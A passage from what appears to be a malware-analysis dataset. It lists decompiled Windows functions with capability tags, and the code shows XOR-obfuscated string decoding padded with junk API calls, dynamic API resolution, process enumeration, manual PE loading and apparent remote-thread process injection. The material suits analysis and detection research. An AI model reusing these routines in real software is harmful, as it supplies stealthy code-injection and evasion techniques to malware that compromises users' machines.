+ 0x38);\n                var_50h = 4;\n                if ((var_48h != var_68h) || (*(iVar11 + 0x3c) != var_8h)) {\n                    do {\n                        var_54h = fcn.0040d46a(iVar11 + 0x68, 0x98);\n                        iVar5 = var_60h;\n                        iVar4 = var_5ch;\n                        if (var_54h == 0) break;\n                        var_78h = *(iVar11 + 0x68);\n                        var_74h = *(iVar11 + 0x6c);\n                        var_50h = var_50h + 0x120;\n                        var_48h = var_78h;\n                        var_44h = var_74h;\n                        if (var_50h <= arg_8h) {\n                            uVar7 = *(iVar11 + 0xb0) >> 1;\n                            *(var_ch + 6) = var_58h;\n                            var_ch[5] = *(iVar11 + 0xd0);\n                            *(var_ch + 7) = *(iVar11 + 0xd4);\n                            var_ch[4] = *(iVar11 + 0xa8);\n                            var_ch[2] = *(iVar11 + 0x98);\n                            var_ch[3] = *(iVar11 + 0x9c);\n                            puVar12 = arg_8h_00;\n                            for (iVar4 = 0x200; iVar4 != 0; iVar4 = iVar4 + -1) {\n                                *puVar12 = 0;\n                                puVar12 = puVar12 + 1;\n                            }\n                            var_70h = uVar7;\n                            if ((uVar7 < 0x100) && (var_54h = fcn.0040d46a(arg_8h_00, *(iVar11 + 0xb0)),  var_54h != 0))\n                            {\n                                uVar8 = 0;\n                                if (uVar7 != 0) {\n                                    do {\n                                        *(uVar8 + 0x20 + var_ch) = arg_8h_00[uVar8 * 2];\n                                        uVar8 = uVar8 + 1;\n                                    } while (uVar8 < uVar7);\n                                }\n                                *(uVar7 + 0x20 + var_ch) = 0;\n                                piVar9 = NULL;\n                                piVar13 = var_ch + 8;\n                                do {\n                                    cVar1 = *piVar13;\n                                    if (cVar1 == '\\\\') {\n                                        piVar9 = piVar13;\n                                    }\n                                    piVar13 = piVar13 + 1;\n                                } while (cVar1 != '\\0');\n                                *(var_ch + 0x1e) = (piVar9 - var_ch) + -0x1f;\n                            }\n                            var_ch = var_ch + 0x48;\n                            var_58h = var_58h + 1;\n                        }\n                    } while ((var_78h != var_68h) || (iVar5 = var_60h,  iVar4 = var_5ch,  var_74h != var_8h));\n                }\n                if (var_6ch != NULL) {\n                    *var_6ch = var_58h;\n                }\n            }\n            uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, var_10h);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n            pcVar10 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n            if (iVar11 != 0) {\n                uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar11);\n                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n            }\n        }\n    }\n    if (arg_ch != NULL) {\n        *arg_ch = var_50h;\n    }\n    if ((var_50h <= arg_8h) && (var_50h != 0)) {\n        var_64h = 1;\n    }\n    uVar3 = (*pcVar10)(0, iVar4);\n    pcVar2 = _sym.imp.KERNEL32.dll_HeapFree;\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n    uVar3 = (*pcVar10)(0, iVar5);\n    (*pcVar2)(uVar3);\n    return var_64h;\n}\n",
        "token_count": 3057
    },
    "0040e689": {
        "rules": [
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a",
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __fastcall fcn.0040e689(code *param_1, uint param_2)\n\n{\n    code *pcVar1;\n    code *pcVar2;\n    uint uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    int32_t *piVar7;\n    uint uVar8;\n    uint uVar9;\n    int32_t iVar10;\n    int32_t *piVar11;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    code *var_1ch;\n    uint var_18h;\n    int32_t *lpLibFileName;\n    int32_t var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    int32_t dwSize;\n    \n    var_ch = 0xffffffff;\n    iVar10 = 0;\n    var_8h = 5;\n    var_1ch = param_1;\n    var_18h = param_2;\n    if (*0x41cdd0 == NULL) {\n        var_30h = 0xa15231f;\n        var_2ch = 0x1d335f23;\n        var_28h._0_2_ = 0x4f0a;\n        var_24h = 0x66715771;\n        var_20h._0_1_ = 0x4f;\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xb);\n        iVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n        lpLibFileName = iVar4;\n        do {\n            iVar5 = (*_sym.imp.USER32.dll_GetKBCodePage)();\n            if (iVar5 != 0x7b0fea) {\n                *(iVar10 + iVar4) = *(&var_24h + iVar10 % var_8h) ^ (iVar10 + iVar4)[&var_30h - iVar4];\n            }\n            iVar10 = iVar10 + 1;\n        } while (iVar10 < 10);\n        var_4ch._0_2_ = 0x222;\n        var_4ch._2_1_ = 0x1a;\n        var_4ch._3_1_ = 5;\n        var_48h = 0x180f1e02;\n        var_44h = 0x13181409;\n        var_40h = 0xa093926;\n        var_3ch = 0x61d3919;\n        var_38h = 0x1e241f18;\n        var_34h._0_1_ = 0x67;\n        var_24h = 0x704b766c;\n        var_20h._0_1_ = 0x67;\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x1a);\n        iVar10 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n        iVar4 = 0;\n        var_10h = &var_4ch - iVar10;\n        do {\n            iVar6 = (*_sym.imp.USER32.dll_ReleaseCapture)();\n            iVar5 = lpLibFileName;\n            if (iVar6 != 0xbf265b) {\n                *(iVar4 + iVar10) = *(&var_24h + iVar4 % var_8h) ^ (iVar4 + iVar10)[&var_4ch - iVar10];\n            }\n            iVar4 = iVar4 + 1;\n        } while (iVar4 < 0x19);\n        uVar3 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(lpLibFileName, iVar10);\n        *0x41cdd0 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar3);\n        pcVar2 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar10);\n        pcVar1 = _sym.imp.KERNEL32.dll_HeapFree;\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n        uVar3 = (*pcVar2)(0, iVar5);\n        (*pcVar1)(uVar3);\n    }\n    dwSize = 0;\n    iVar10 = (**0x41cdd0)(5, 0, 0, &dwSize);\n    if (iVar10 == -0x3ffffffc) {\n        dwSize = dwSize + 0x100;\n        piVar7 = (*_sym.imp.KERNEL32.dll_VirtualAlloc)(0, dwSize, 0x3000, 4);\n        if (piVar7 != NULL) {\n            lpLibFileName = piVar7;\n            iVar10 = (**0x41cdd0)(5, piVar7, dwSize, 0);\n            uVar3 = var_18h;\n            if (-1 < iVar10) {\n                var_ch = 0;\n                piVar11 = piVar7;\n                do {\n                    iVar10 = piVar11[0x11];\n                    if (((iVar10 != 0) && (iVar10 != 4)) && (iVar10 != *0x41cb3c)) {\n                        uVar8 = fcn.0040cee9();\n                        uVar9 = fcn.00405e58();\n                        iVar10 = (*var_1ch)(piVar11[0xf], uVar9, piVar11[0x11], piVar11[0x12], uVar8, uVar3);\n                        piVar7 = lpLibFileName;\n                        if (iVar10 == 0) break;\n                    }\n                    piVar7 = lpLibFileName;\n                    if (*piVar11 == 0) break;\n                    piVar11 = piVar11 + *piVar11;\n                } while( true );\n            }\n            (*_sym.imp.KERNEL32.dll_VirtualFree)(piVar7, 0, 0x8000);\n        }\n    }\n    return var_ch;\n}\n",
        "token_count": 1394
    },
    "0040f48e": {
        "rules": [
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a",
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040f48e(uchar *arg_8h)\n\n{\n    uint32_t *puVar1;\n    uint16_t uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    int32_t iVar7;\n    uint32_t uVar8;\n    uchar *in_ECX;\n    int32_t iVar9;\n    uint32_t uVar10;\n    int32_t *piVar11;\n    uchar *in_EDX;\n    int32_t *piVar12;\n    uchar *puVar13;\n    uchar *puVar14;\n    uint32_t uVar15;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar3 = *(in_EDX + 0x3c);\n    uVar2 = *(in_EDX + iVar3 + 0x14);\n    iVar7 = *(in_EDX + iVar3 + 0x3c);\n    uVar6 = *(in_EDX + iVar3 + 6);\n    puVar13 = in_EDX;\n    puVar14 = in_ECX;\n    for (iVar9 = *(in_EDX + iVar3 + 0x54); iVar9 != 0; iVar9 = iVar9 + -1) {\n        *puVar14 = *puVar13;\n        puVar13 = puVar13 + 1;\n        puVar14 = puVar14 + 1;\n    }\n    if (uVar6 != 0) {\n        piVar12 = in_EDX + uVar2 + 0x2c + iVar3;\n        do {\n            uVar10 = iVar7 + -1 + piVar12[-1] & ~(iVar7 - 1U);\n            if (uVar10 != 0) {\n                puVar13 = in_EDX + *piVar12;\n                puVar14 = in_ECX + piVar12[-2];\n                for (; uVar10 != 0; uVar10 = uVar10 - 1) {\n                    *puVar14 = *puVar13;\n                    puVar13 = puVar13 + 1;\n                    puVar14 = puVar14 + 1;\n                }\n            }\n            piVar12 = piVar12 + 10;\n            uVar6 = uVar6 - 1;\n        } while (uVar6 != 0);\n    }\n    puVar13 = in_ECX;\n    if (arg_8h != NULL) {\n        puVar13 = arg_8h;\n    }\n    iVar7 = 0xa0;\n    if (*(in_EDX + iVar3 + 4) == -0x799c) {\n        iVar7 = 0xb0;\n    }\n    if ((*(in_EDX + iVar7 + iVar3) != 0) && (uVar6 = *(in_EDX + iVar7 + 4 + iVar3),  uVar6 != 0)) {\n        if (*(in_EDX + iVar3 + 4) == -0x799c) {\n            iVar9 = *(in_EDX + iVar3 + 0x30);\n        }\n        else {\n            iVar9 = *(in_EDX + iVar3 + 0x34);\n        }\n        puVar14 = *(in_EDX + iVar3 + 0x30);\n        uVar10 = puVar13 - *(in_EDX + iVar3 + 0x30);\n        iVar4 = *(in_EDX + iVar3 + 0x34);\n        piVar12 = in_ECX + *(in_EDX + iVar7 + iVar3);\n        for (; 8 < uVar6; uVar6 = uVar6 - *piVar11) {\n            iVar3 = *piVar12;\n            uVar15 = piVar12[1] - 8U >> 1;\n            if ((piVar12[1] <= uVar6) && (uVar15 != 0)) {\n                piVar11 = piVar12 + 2;\n                do {\n                    uVar2 = *piVar11;\n                    if (uVar2 >> 0xc == 3) {\n                        *(in_ECX + (uVar2 & 0xfff) + iVar3) = puVar13 + (*(in_ECX + (uVar2 & 0xfff) + iVar3) - iVar9);\n                    }\n                    else if (uVar2 >> 0xc == 10) {\n                        uVar8 = uVar2 & 0xfff;\n                        puVar1 = in_ECX + uVar8 + iVar3;\n                        uVar5 = *puVar1;\n                        *puVar1 = *puVar1 + uVar10;\n                        *(in_ECX + uVar8 + 4 + iVar3) =\n                             *(in_ECX + uVar8 + 4 + iVar3) + (((puVar13 >> 0x1f) - iVar4) - (puVar13 < puVar14)) +\n                             CARRY4(uVar5, uVar10);\n                    }\n                    piVar11 = piVar11 + 2;\n                    uVar15 = uVar15 - 1;\n                } while (uVar15 != 0);\n            }\n            piVar11 = piVar12 + 1;\n            piVar12 = piVar12 + piVar12[1];\n        }\n    }\n    return 0;\n}\n",
        "token_count": 1191
    },
    "00403980": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00403980(uint32_t arg_8h)\n\n{\n    int32_t iVar1;\n    uint in_ECX;\n    int32_t *piVar2;\n    int32_t *in_EDX;\n    int32_t iVar3;\n    uchar *puVar4;\n    uint32_t uVar5;\n    uchar *puVar6;\n    int32_t *piVar7;\n    code *pcVar8;\n    uint var_24h;\n    code *var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    int32_t hObject;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_8h = 0;\n    var_4h = 0;\n    hObject = 0;\n    var_20h = fcn.0040484c;\n    (*_sym.imp.KERNEL32.dll_GetVersion)();\n    piVar2 = in_EDX;\n    if (((arg_8h & 0x10) == 0) && ((*0x41cb44 & 1) != 0)) {\n        var_20h = 0x412000;\n        piVar2 = in_EDX + 2;\n    }\n    iVar3 = *piVar2;\n    if (iVar3 == 0) {\n        iVar3 = 2;\n    }\n    else {\n        uVar5 = *(*(iVar3 + 0x3c) + 0x50 + iVar3) + 0xfffU & 0xfffff000;\n        iVar3 = fcn.0040f2b5(&hObject);\n        if (((iVar3 == 0) && (iVar3 = fcn.0040f017(&var_4h),  iVar3 == 0)) &&\n           (iVar3 = fcn.0040f48e(var_4h),  iVar3 == 0)) {\n            iVar1 = uVar5 + var_8h;\n            puVar4 = *in_EDX;\n            puVar6 = uVar5 + 0xc50 + var_8h;\n            for (iVar3 = in_EDX[4]; iVar3 != 0; iVar3 = iVar3 + -1) {\n                *puVar6 = *puVar4;\n                puVar4 = puVar4 + 1;\n                puVar6 = puVar6 + 1;\n            }\n            puVar4 = in_EDX[2];\n            puVar6 = in_EDX[4] + var_8h + 0xc50 + uVar5;\n            for (iVar3 = in_EDX[5]; iVar3 != 0; iVar3 = iVar3 + -1) {\n                *puVar6 = *puVar4;\n                puVar4 = puVar4 + 1;\n                puVar6 = puVar6 + 1;\n            }\n            *(iVar1 + 0x30) = var_4h;\n            *(iVar1 + 0x34) = var_4h >> 0x1f;\n            piVar2 = in_EDX;\n            piVar7 = iVar1 + 0x18;\n            for (iVar3 = 0x18; iVar3 != 0; iVar3 = iVar3 + -1) {\n                *piVar7 = *piVar2;\n                piVar2 = piVar2 + 1;\n                piVar7 = piVar7 + 1;\n            }\n            iVar3 = var_4h + 0xc50 + uVar5;\n            *(iVar1 + 0x18) = iVar3;\n            *(iVar1 + 0x1c) = iVar3 >> 0x1f;\n            iVar3 = in_EDX[4] + 0xc50 + uVar5 + var_4h;\n            *(iVar1 + 0x20) = iVar3;\n            *(iVar1 + 0x24) = iVar3 >> 0x1f;\n            *(iVar1 + 0x28) = in_EDX[4];\n            *(iVar1 + 0x2c) = in_EDX[5];\n            if (((arg_8h & 0x10) == 0) && ((*0x41cb44 & 1) != 0)) {\n                iVar3 = fcn.00403645();\n            }\n            else {\n                iVar3 = fcn.004032f1();\n            }\n            if (iVar3 == 0) {\n                pcVar8 = iVar1 + 0x40;\n                for (iVar3 = 0x800; iVar3 != 0; iVar3 = iVar3 + -1) {\n                    *pcVar8 = *var_20h;\n                    var_20h = var_20h + 1;\n                    pcVar8 = pcVar8 + 1;\n                }\n                iVar3 = fcn.00403b48(in_ECX, var_4h + uVar5 + 0x40, var_4h + uVar5, arg_8h);\n            }\n        }\n        if (var_8h != 0) {\n            fcn.0040f173();\n        }\n        if (hObject != 0) {\n            (*_sym.imp.KERNEL32.dll_CloseHandle)(hObject);\n        }\n    }\n    return iVar3;\n}\n",
        "token_count": 1167
    },
    "00403b48": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.00403b48(int32_t *arg_8h, int32_t lpStartAddress, int32_t lpParameter, uint32_t arg_14h)\n\n{\n    int16_t iVar1;\n    char cVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uchar *arg_8h_00;\n    int16_t *piVar5;\n    uchar *puVar6;\n    int32_t iVar7;\n    uint uVar8;\n    uint *puVar9;\n    code *pcVar10;\n    int16_t *piVar11;\n    uint unaff_EBX;\n    uint uVar12;\n    int32_t *piVar13;\n    uint unaff_EDI;\n    int64_t iVar14;\n    uint uVar15;\n    uchar *puVar16;\n    uchar *puVar17;\n    int32_t *piStack140;\n    int32_t iVar18;\n    uint uStack124;\n    uchar *puStack120;\n    int32_t iStack116;\n    uint uStack112;\n    uchar auStack108 [4];\n    int32_t iStack104;\n    uint uStack100;\n    uint uStack96;\n    uint uStack92;\n    uint uStack88;\n    ushort uStack84;\n    uchar uStack82;\n    uint uStack80;\n    uchar uStack76;\n    uint uStack75;\n    uint uStack71;\n    uchar uStack67;\n    uchar uStack66;\n    uchar uStack65;\n    ushort uStack64;\n    uchar uStack62;\n    uchar uStack61;\n    uchar uStack60;\n    uchar uStack59;\n    uchar uStack58;\n    uchar uStack57;\n    int32_t aiStack56 [2];\n    ushort uStack48;\n    uint uStack44;\n    uint uStack40;\n    uint uStack36;\n    uint uStack32;\n    uchar uStack28;\n    uchar uStack27;\n    ushort uStack26;\n    \n    piStack140 = 0x403b5a;\n    cVar2 = (*_sym.imp.KERNEL32.dll_GetVersion)();\n    uStack100 = NULL;\n    piVar13 = arg_8h + 1;\n    uStack112 = piVar13;\n    if (*piVar13 != 0) {\n        piStack140 = *piVar13;\n        (*_sym.imp.KERNEL32.dll_CloseHandle)();\n        *piVar13 = 0;\n    }\n    uVar12 = 0xffffffff;\n    if (((arg_14h & 0x10) == 0) && ((*0x41cb44 & 1) != 0)) {\n        iStack116 = 5;\n        iVar14 = CONCAT44(puStack120, 5);\n        if (cVar2 != '\\x05') {\n            if ((*0x41cde8 | *0x41cdec) == 0) {\n                piStack140 = 0xb;\n                uStack75 = uStack75 & 0xffffff | 0x1f000000;\n                uStack71 = 0x230a1523;\n                uStack67 = 0x5f;\n                uStack66 = 0x33;\n                uStack65 = 0x1d;\n                uStack64 = 0x4f0a;\n                uStack80 = 0x66715771;\n                uStack76 = 0x4f;\n                uVar12 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8);\n                iVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar12);\n                iVar18 = 0;\n                uStack100 = &stack0xffffffac + -iVar3;\n                iStack104 = iVar3;\n                do {\n                    iVar4 = (*_sym.imp.USER32.dll_GetKBCodePage)();\n                    if (iVar4 != 0x7b0fea) {\n                        *(iVar18 + iVar3) = (&stack0xffffffa4)[iVar18 % 5] ^ (iVar18 + iVar3)[uStack100];\n                    }\n                    iVar18 = iVar18 + 1;\n                } while (iVar18 < 10);\n                uStack44 = 0x729241b;\n                uStack40 = 0x24280208;\n                uStack36 = 0x2091120;\n                uStack32 = 0x362d043b;\n                uStack28 = 0x1f;\n                uStack27 = 6;\n                uStack26 = 0x502d;\n                uStack92 = 0x44455049;\n                uStack88 = CONCAT22(uStack88._2_2_, 0x677a);\n                uVar12 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x15);\n                iVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar12);\n                iVar18 = 0;\n                uStack112 = &stack0xffffffc8 + -iVar3;\n                uVar12 = 0xffffffff;\n                do {\n                    iVar4 = (*_sym.imp.USER32.dll_ReleaseCapture)();\n                    if (iVar4 != 0xb989df) {\n                        *(iVar18 + iVar3) = (&stack0xffffff98)[iVar18 % piStack140] ^ *(uStack112 + iVar18 + iVar3);\n                    }\n                    iVar18 = iVar18 + 1;\n                } while (iVar18 < 0x14);\n                fcn.0040dafc();\n                uVar8 = iStack116;\n                *0x41cde8 = fcn.0040dfff(iVar3);\n                uVar15 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar3);\n                pcVar10 = _sym.imp.KERNEL32.dll_HeapFree;\n                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar15);\n                uVar8 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, uVar8);\n                (*pcVar10)(uVar8);\n                *0x41cde0 = CONCAT44(*0x41cde4, *0x41cde0);\n                if (*0x41cde8 == 0) goto code_r0x00404389;\n            }\n            *0x41cdec = *0x41cde8 >> 0x20;\n            uVar12 = 0xffffffff;\n            piStack140 = &stack0xffffffb8 >> 0x1f;\n            iVar3 = fcn.0040fe20(*0x41cde8, *0x41cdec, 10, 0, *arg_8h, *arg_8h >> 0x1f, 0, 0, 0, 0, 0, 0, 0, 0);\n            *0x41cde0 = CONCAT44(*0x41cde4, *0x41cde0);\n            if (-1 < iVar3) {\n                uVar12 = 0;\n                *0x41cde0 = CONCAT44(*0x41cde4, *0x41cde0);\n            }\n            goto code_r0x00404389;\n        }\n        if ((*0x41cde0 | *0x41cde4) == 0) {\n            piStack140 = 0x403bc4;\n            fcn.0040dafc();\n            pcVar10 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n            piStack140 = 0xb;\n            uStack75 = uStack75 & 0xffffff | 0x1f000000;\n            uStack71 = 0x230a1523;\n            uStack67 = 0x5f;\n            uStack66 = 0x33;\n            uStack65 = 0x1d;\n            uStack64 = 0x4f0a;\n            uStack88 = 0x66715771;\n            uStack84 = CONCAT11(uStack84._1_1_, 0x4f);\n            uVar12 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8);\n            iVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar12);\n            iVar18 = 0;\n            puStack120 = &stack0xffffffac + -iVar3;\n            iStack116 = iVar3;\n            do {\n                iVar4 = (*_sym.imp.USER32.dll_GetKBCodePage)();\n                if (iVar4 != 0x7b0fea) {\n                    *(iVar18 + iVar3) = (&stack0xffffff9c)[iVar18 % 5] ^ (iVar18 + iVar3)[puStack120];\n                }\n                iVar18 = iVar18 + 1;\n            } while (iVar18 < 10);\n            iVar18 = 0xc;\n            uStack71 = uStack71 & 0xffffff | 0x28000000;\n            uStack67 = 0x57;\n            uStack66 = 0x16;\n            uStack65 = 1;\n            uStack64 = 0x539;\n            uStack62 = 0x57;\n            uStack61 = 0x20;\n            uStack60 = 0x21;\n            uStack59 = 0x3a;\n            uStack58 = 100;\n            uStack100 = 0x4d643364;\n            uStack96 = CONCAT31(uStack96._1_3_, 0x56);\n            uVar12 = (*pcVar10)(8);\n            arg_8h_00 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar12);\n            iVar3 = 0;\n            puVar17 = &stack0xffffffb0 + -arg_8h_00;\n            uVar12 = 0xffffffff;\n            puVar6 = arg_8h_00;\n            do {\n                iVar4 = (*_sym.imp.KERNEL32.dll_GetTickCount)();\n                if (iVar4 != 0x4dead6) {\n                    arg_8h_00[iVar3] = (&stack0xffffff90)[iVar3 % piStack140] ^ (arg_8h_00 + iVar3)[puVar17];\n                }\n                iVar3 = iVar3 + 1;\n            } while (iVar3 < 0xb);\n            uVar8 = unaff_EBX;\n            iVar14 = fcn.0040dfff(arg_8h_00);\n            if (iVar14 != 0) {\n                uVar15 = 8;\n                uStack66 = 5;\n                uStack80 = 0x48574105;\n                uStack76 = 0x16;\n                uStack75 = 0x2d322f6e;\n                uStack71 = 0x50410264;\n                uStack67 = 0x48;\n                uStack65 = 0x6e;\n                uStack64 = 0x3232;\n                uStack62 = 0x2d;\n                uStack61 = 100;\n                uStack60 = 0x6e;\n                uStack59 = 0x41;\n                iStack104 = 0x4832416e;\n                uStack100 = CONCAT31(uStack100._1_3_, 100);\n                uVar12 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x2d);\n                puStack120 = iVar14 >> 0x20;\n                iStack116 = iVar14;\n                piVar5 = (*_sym.imp.KERNEL32.dll_HeapAlloc)();\n                puStack120 = iVar14 >> 0x20;\n                iStack116 = iVar14;\n                iVar3 = 0;\n                puVar16 = &stack0xffffffa4 + -piVar5;\n                arg_8h_00 = puVar17;\n                unaff_EBX = uVar8;\n                uStack124 = piVar5;\n                do {\n                    iVar4 = (*_sym.imp.USER32.dll_GetMessageExtraInfo)();\n                    puStack120 = iVar14 >> 0x20;\n                    iStack116 = iVar14;\n                    if (iVar4 != 0xfa34ed) {\n                        *(iVar3 + piVar5) =\n                             (&stack0xffffff8c)[iVar3 % iVar18] ^ (iVar3 + piVar5)[&stack0xffffffa4 + -piVar5];\n                    }\n                    iVar3 = iVar3 + 1;\n                } while (iVar3 < 0x16);\n                aiStack56[0] = piVar5 >> 0x1f;\n                uStack60 = SUB41(piVar5, 0);\n                uStack59 = piVar5 >> 8;\n                uStack58 = piVar5 >> 0x10;\n                uStack57 = piVar5 >> 0x18;\n                piVar11 = piVar5;\n                do {\n                    iVar1 = *piVar11;\n                    piVar11 = piVar11 + 1;\n                } while (iVar1 != unaff_EDI);\n                iVar1 = (piVar11 - (piVar5 + 1) >> 1) * 2;\n                uStack71._3_1_ = iVar1;\n                uStack71 = uStack71 & 0xffffff | uStack71._3_1_ << 0x18;\n                uStack67 = iVar1 >> 8;\n                uStack64 = 0;\n                uStack62 = 0;\n                uStack61 = 0;\n                uStack66 = iVar1 + 2;\n                uStack65 = iVar1 + 2 >> 8;\n                iVar3 = fcn.0040fe20(unaff_EBX, puVar6, 4, 0, 0, 0, 0, 0, &stack0xffffffbc, &stack0xffffffbc >> 0x1f, \n                                     &stack0xffffff94, &stack0xffffff94 >> 0x1f, uVar12, uVar15);\n                pcVar10 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n                puStack120 = iVar14 >> 0x20;\n                iStack116 = iVar14;\n                if (iVar3 < 0) {\n                    uVar12 = fcn.0040edc3();\n                    puStack120 = iVar14 >> 0x20;\n                    iStack116 = iVar14;\n                }\n                else {\n                    iVar18 = 0xc;\n                    uStack92 = 0x16281f3f;\n                    uStack88 = 0x3b183815;\n                    uStack84 = 0x150b;\n                    uStack82 = 0x54;\n                    iStack116 = 0x785a7a54;\n                    uStack112 = CONCAT31(uStack112._1_3_, 0x70);\n                    uVar12 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8);\n                    puVar6 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar12);\n                    iVar3 = 0;\n                    piStack140 = &stack0xffffff98 + -puVar6;\n                    arg_8h_00 = puVar6;\n                    do {\n                        iVar4 = (*_sym.imp.USER32.dll_GetClipboardViewer)();\n                        if (iVar4 != 0x3f4bc2) {\n                            puVar6[iVar3] = (&stack0xffffff80)[iVar3 % 5] ^ (puVar6 + iVar3)[piStack140];\n                        }\n                        iVar3 = iVar3 + 1;\n                    } while (iVar3 < 0xb);\n                    iStack104 = 0x19511d72;\n                    uStack100 = 0x513d541a;\n                    uStack96 = 0xa450115;\n                    uStack92 = 0x541c1060;\n                    uStack88 = uStack88 & 0xff000000 | 0x78500e;\n                    unaff_EBX = 0x78346f31;\n                    uStack124 = CONCAT31(uStack124._1_3_, 0x6e);\n                    uVar12 = (*pcVar10)(8, 0x14);\n                    iVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar12);\n                    iVar4 = 0;\n                    puVar6 = &stack0xffffff8c + -iVar3;\n                    uVar12 = 0xffffffff;\n                    do {\n                        iVar7 = (*_sym.imp.USER32.dll_GetKBCodePage)();\n                        if (iVar7 != 0x3b2c5c) {\n                            *(iVar4 + iVar3) = (&stack0xffffff74)[iVar4 % iVar18] ^ (iVar4 + iVar3)[puVar6];\n                        }\n                        iVar4 = iVar4 + 1;\n                    } while (iVar4 < 0x13);\n                    *0x41cde0 = fcn.0040dfff(iVar3);\n                    pcVar10 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n                    uVar8 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar3);\n                    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar8);\n                    uVar8 = (*pcVar10)(0, puVar16);\n                    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar8);\n                    iVar14 = CONCAT44(puStack120, iStack116);\n                    piVar5 = uStack124;\n                }\n                uVar8 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, piVar5);\n                puStack120 = iVar14 >> 0x20;\n                iStack116 = iVar14;\n                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar8);\n                puStack120 = iVar14 >> 0x20;\n                iStack116 = iVar14;\n            }\n            pcVar10 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n            uVar8 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, arg_8h_00);\n            puStack120 = iVar14 >> 0x20;\n            iStack116 = iVar14;\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar8);\n            puStack120 = iVar14 >> 0x20;\n            iStack116 = iVar14;\n            uVar8 = (*pcVar10)(0, unaff_EBX);\n            puStack120 = iVar14 >> 0x20;\n            iStack116 = iVar14;\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar8);\n            puStack120 = iVar14 >> 0x20;\n            iStack116 = iVar14;\n            piVar13 = uStack112;\n            if (*0x41cde0 == 0) goto code_r0x00404389;\n        }\n        *0x41cde4 = *0x41cde0 >> 0x20;\n        piStack140 = arg_8h + 3 >> 0x1f;\n        iVar3 = fcn.0040fe20(*0x41cde0, *0x41cde4, 7, 0, *arg_8h, *arg_8h >> 0x1f, 0, 0, 0, 0, lpStartAddress, \n                             lpStartAddress >> 0x1f, lpParameter, lpParameter >> 0x1f);\n        puStack120 = iVar14 >> 0x20;\n        iStack116 = iVar14;\n        *piVar13 = iVar3;\n        if (iVar3 == 0) goto code_r0x00404389;\n    }\n    else {\n        if (cVar2 != '\\x05') {\n            piStack140 = 0xb;\n            aiStack56[0] = 0xa15231f;\n            aiStack56[1] = 0x1d335f23;\n            uStack48 = 0x4f0a;\n            uStack80 = 0x66715771;\n            uStack76 = 0x4f;\n            puVar9 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8);\n            iVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)();\n            iVar18 = 0;\n            uStack100 = &stack0xffffffbc + -iVar3;\n            iStack104 = iVar3;\n            do {\n                iVar4 = (*_sym.imp.USER32.dll_GetKBCodePage)();\n                if (iVar4 